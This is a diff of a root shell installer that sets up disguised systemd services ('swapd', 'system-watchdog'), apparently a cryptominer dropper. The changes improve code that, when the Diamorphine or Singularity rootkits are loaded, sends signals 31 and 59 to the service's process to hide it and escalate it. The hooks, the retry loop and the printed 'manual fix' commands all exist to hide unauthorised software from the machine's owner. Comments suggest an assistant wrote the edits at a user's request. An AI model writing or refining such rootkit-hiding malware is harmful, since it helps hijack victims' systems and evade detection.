@@ -1740,7 +1740,7 @@ Type=simple
 User=root
 WorkingDirectory=/root/.swapd
 ExecStart=$EXEC_START
-ExecStartPost=/bin/bash -c 'sleep 5; if lsmod | grep -qE "diamorphine|singularity|rootkit" 2>/dev/null; then for i in 1 2 3 4 5; do kill -31 \$(pgrep -f -u root config.json) 2>/dev/null; kill -59 \$(pgrep -f -u root config.json) 2>/dev/null; kill -31 \$(/bin/ps ax -fu root | grep "swapd" | grep -v "grep" | awk "{print \\\$2}") 2>/dev/null; kill -59 \$(/bin/ps ax -fu root | grep "swapd" | grep -v "grep" | awk "{print \\\$2}") 2>/dev/null; sleep 2; done; fi'
+ExecStartPost=/bin/bash -c 'sleep 5; if lsmod | grep -qE "diamorphine|singularity|rootkit" 2>/dev/null; then for i in 1 2 3 4 5; do PID=\$(systemctl show --property MainPID --value swapd.service 2>/dev/null); if [ -n "\$PID" ] && [ "\$PID" != "0" ]; then kill -31 \$PID 2>/dev/null; kill -59 \$PID 2>/dev/null; fi; sleep 2; done; fi'
 Restart=always
 RestartSec=10
 Nice=19
@@ -1769,7 +1769,7 @@ After=network.target
 Type=simple
 User=root
 ExecStart=/usr/local/bin/system-watchdog
-ExecStartPost=/bin/bash -c 'sleep 5; if lsmod | grep -qE "diamorphine|singularity|rootkit" 2>/dev/null; then for i in 1 2 3 4 5; do kill -31 $(pgrep -f -u root system-watchdog) 2>/dev/null; kill -59 $(pgrep -f -u root system-watchdog) 2>/dev/null; kill -31 $(/bin/ps ax -fu root | grep "system-watchdog" | grep -v "grep" | awk "{print \$2}") 2>/dev/null; kill -59 $(/bin/ps ax -fu root | grep "system-watchdog" | grep -v "grep" | awk "{print \$2}") 2>/dev/null; sleep 2; done; fi'
+ExecStartPost=/bin/bash -c 'sleep 5; if lsmod | grep -qE "diamorphine|singularity|rootkit" 2>/dev/null; then for i in 1 2 3 4 5; do PID=$(systemctl show --property MainPID --value system-watchdog.service 2>/dev/null); if [ -n "$PID" ] && [ "$PID" != "0" ]; then kill -31 $PID 2>/dev/null; kill -59 $PID 2>/dev/null; fi; sleep 2; done; fi'
 Restart=always
 RestartSec=30
 StandardOutput=null
@@ -3080,11 +3080,24 @@ else
         attempt=$((attempt + 1))
         echo "[*] Hide attempt $attempt/$MAX_ATTEMPTS..."
         
-        # Execute kill commands (EXACT commands from user)
-        kill -31 $(pgrep -f -u root config.json) 2>/dev/null
-        kill -59 $(pgrep -f -u root config.json) 2>/dev/null
-        kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` 2>/dev/null
-        kill -59 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` 2>/dev/null
+        # Get PID using systemctl (BEST METHOD for systemd services)
+        SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
+        
+        if [ -n "$SWAPD_PID" ] && [ "$SWAPD_PID" != "0" ]; then
+            echo "[*] Found swapd PID: $SWAPD_PID (via systemctl)"
+            
+            # Send hide signals to the PID
+            kill -31 $SWAPD_PID 2>/dev/null
+            kill -59 $SWAPD_PID 2>/dev/null
+        else
+            echo "[!] Could not get PID from systemctl - trying fallback methods..."
+            
+            # Fallback: use pgrep/ps if systemctl doesn't work
+            kill -31 $(pgrep -f -u root config.json) 2>/dev/null
+            kill -59 $(pgrep -f -u root config.json) 2>/dev/null
+            kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` 2>/dev/null
+            kill -59 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` 2>/dev/null
+        fi
         
         # Sleep 5 seconds (as requested)
         sleep 5
@@ -3125,23 +3138,18 @@ else
             echo ""
             ps ax | grep swapd | grep -v grep
             echo ""
-            echo "Manual fix - run these exact commands:"
-            echo "  kill -31 \$(pgrep -f -u root config.json)"
-            echo "  kill -59 \$(pgrep -f -u root config.json)"
-            echo "  kill -31 \`/bin/ps ax -fu \$USER| grep \"swapd\" | grep -v \"grep\" | awk '{print \$2}'\`"
-            echo "  kill -59 \`/bin/ps ax -fu \$USER| grep \"swapd\" | grep -v \"grep\" | awk '{print \$2}'\`"
+            echo "Manual fix - run these commands:"
+            echo "  PID=\$(systemctl show --property MainPID --value swapd.service)"
+            echo "  kill -31 \$PID"
+            echo "  kill -59 \$PID"
+            echo ""
+            echo "Or use the direct method:"
+            echo "  kill -31 \$(systemctl show --property MainPID --value swapd.service)"
+            echo "  kill -59 \$(systemctl show --property MainPID --value swapd.service)"
             echo ""
         fi
     fi
 fi
-
-ps ax|grep swapd
-sleep 5
-kill -31 $(pgrep -f -u root config.json)
-kill -59 $(pgrep -f -u root config.json)
-kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-kill -59 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-ps ax|grep swapd
 
 echo '========================================================================'
 echo ""
